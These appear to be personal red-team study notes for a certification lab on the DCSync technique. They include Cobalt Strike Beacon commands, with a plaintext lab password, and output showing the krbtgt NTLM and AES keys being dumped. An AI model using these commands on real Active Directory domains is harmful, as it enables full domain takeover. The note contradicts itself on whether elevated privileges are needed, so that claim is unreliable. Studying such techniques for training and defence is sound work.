The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronise and replicate Active Directory data between domain controllers.

DCSync is a technique used particularly in the context of [[Active Directory]] environments, to retrieve password data from a [[Domain Controller]] without requiring elevated privileges or directly interacting with the targeted user's account. 

DCSync is a feature within the [[Mimikatz]] toolkit.


## 🖊️ How it works

1. **Domain Controller Interaction**: Mimikatz uses DCSync to interact with the domain controller's replication protocol, which is used to synchronize data between domain controllers in an Active Directory environment.
    
2. **Password Retrieval**: With DCSync, an attacker can request password data for a specified user account from the domain controller. This includes the password hash ([[NetNTLM]] or [[Kerberos]]) and other relevant information associated with the account.
    
3. **Low-Level Access**: Unlike traditional methods of password retrieval, such as credential dumping or brute force attacks, DCSync does not require elevated privileges or direct access to the target user's account. Instead, it leverages the domain controller's replication mechanism, making it a stealthy and effective technique for obtaining password data.

  This requires [GetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) which is usually only available to domain admins.  The technique is included here for completeness, and it will be useful later on.

## 🖊️ via [[Cobalt Strike]]

1) Beacon has a dedicated `dcsync` command, which calls `mimikatz lsadump::dcsync` in the background.

```
beacon> make_token DEV\nlamb F3rrari

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
		
* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

Here we have extracted the NTLM and AES keys for the krbtgt account using _lamb_ (a domain admin).

### ⚠ Opsec

Directory replication can be detected if Directory Service Access auditing is enabled.

### Properties
---
📆 created   {{10-02-2024}} 21:57
🏷️ tags: #activedirectory #redteam #crto 

---

